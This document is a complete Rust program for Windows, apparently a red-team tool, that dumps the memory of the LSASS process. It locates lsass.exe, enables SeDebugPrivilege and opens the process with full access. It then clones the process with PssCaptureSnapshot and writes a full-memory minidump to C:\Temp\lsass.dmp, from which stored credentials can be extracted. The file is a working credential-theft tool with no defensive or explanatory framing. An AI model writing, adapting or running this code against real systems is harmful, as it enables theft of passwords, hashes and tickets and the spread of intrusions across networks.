use std::{mem::zeroed, os::raw::c_void, ptr::null_mut};

use windows_sys::{
    Wdk::System::SystemInformation::NtQuerySystemInformation,
    Win32::{
        Foundation::{
            ERROR_NOT_ALL_ASSIGNED, GENERIC_WRITE, GetLastError, INVALID_HANDLE_VALUE,
            STATUS_INFO_LENGTH_MISMATCH,
        },
        Security::{
            AdjustTokenPrivileges, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
            TOKEN_QUERY,
        },
        Storage::FileSystem::{CREATE_ALWAYS, CreateFileA, FILE_ATTRIBUTE_NORMAL},
        System::{
            Diagnostics::{
                Debug::{
                    MiniDumpWithFullMemory, MiniDumpWithFullMemoryInfo, MiniDumpWithThreadInfo,
                    MiniDumpWriteDump,
                },
                ProcessSnapshotting::{
                    PSS_CAPTURE_HANDLES, PSS_CAPTURE_THREAD_CONTEXT, PSS_CAPTURE_THREADS,
                    PSS_CAPTURE_VA_CLONE, PSS_CREATE_BREAKAWAY_OPTIONAL, PssCaptureSnapshot,
                },
            },
            Threading::{GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS},
            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
        },
    },
};

#[allow(non_snake_case)]
fn NT_SUCCESS(Status: i32) -> bool {
    Status >= 0
}

fn get_pid(proc_name: &str) -> u32 {
    let mut pid: u32 = 0;
    unsafe {
        let mut return_length: u32 = 0;
        let status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            null_mut(),
            0,
            &mut return_length,
        );

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information");
            return pid;
        }

        let buffer_size = return_length as usize;
        let buffer = vec![0u8; buffer_size];

        let status = NtQuerySystemInformation(
            5, // SystemProcessInformation
            buffer.as_ptr() as *mut c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if !NT_SUCCESS(status) {
            println!("[-] Failed to query system information");
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && proc_name.eq_ignore_ascii_case(
                    String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn enable_privilege() -> bool {
    unsafe {
        let mut token_handle: *mut c_void = null_mut();

        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        ) == 0
        {
            println!("[-] Failed to open process token");
            return false;
        }

        let mut token_privileges = zeroed::<TOKEN_PRIVILEGES>();
        token_privileges.PrivilegeCount = 1;
        token_privileges.Privileges[0].Luid.LowPart = 20; // SE_PRIVILEGE_ENABLED
        token_privileges.Privileges[0].Luid.HighPart = 0;
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(
            token_handle,
            0,
            &mut token_privileges,
            size_of::<TOKEN_PRIVILEGES>() as u32,
            null_mut(),
            null_mut(),
        ) == 0
        {
            println!("[-] Failed to adjust token privileges");
            return false;
        }

        if GetLastError() == ERROR_NOT_ALL_ASSIGNED {
            println!("[-] The token does not have the specified privilege.");
            return false;
        }
    }
    true
}

fn main() {
    let proc_name = "lsass.exe";

    let pid = get_pid(proc_name);

    if pid == 0 {
        println!("[-] Failed to find lsass.exe process");
        return;
    }

    println!("[+] Found lsass.exe process with PID: {}", pid);

    if !enable_privilege() {
        println!("[-] Failed to enable SeDebugPrivilege");
        return;
    }

    println!("[+] SeDebugPrivilege enabled successfully");

    unsafe {
        let lsass_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

        if lsass_handle.is_null() {
            println!("[-] Failed to open lsass.exe process");
            return;
        }

        println!("[+] Opened handle to lsass.exe process: {:?}", lsass_handle);

        let mut snapshot: *mut c_void = null_mut();
        let result = PssCaptureSnapshot(
            lsass_handle,
            PSS_CAPTURE_VA_CLONE
                | PSS_CAPTURE_HANDLES
                | PSS_CAPTURE_THREADS
                | PSS_CAPTURE_THREAD_CONTEXT
                | PSS_CREATE_BREAKAWAY_OPTIONAL,
            0x001F_FFFF,
            &mut snapshot,
        );

        println!("[+] PssCaptureSnapshot result: {}", result);

        if result != 0 {
            println!("[-] Failed to capture snapshot of lsass.exe process ");
            return;
        }

        println!("[+] Captured snapshot of lsass.exe process: {:?}", snapshot);

        let file_handle = CreateFileA(
            "C:\\Temp\\lsass.dmp\0".as_ptr() as *const u8,
            GENERIC_WRITE,
            0,
            null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if file_handle == INVALID_HANDLE_VALUE {
            println!("[-] Failed to create dump file");
            return;
        }

        if MiniDumpWriteDump(
            snapshot,
            pid,
            file_handle,
            MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithThreadInfo,
            null_mut(),
            null_mut(),
            null_mut(),
        ) == 0
        {
            println!("[-] Failed to write minidump of lsass.exe process");
            return;
        }

        println!("[+] Successfully dumped lsass.exe process to C:\\Temp\\lsass.dmp");
    }
}
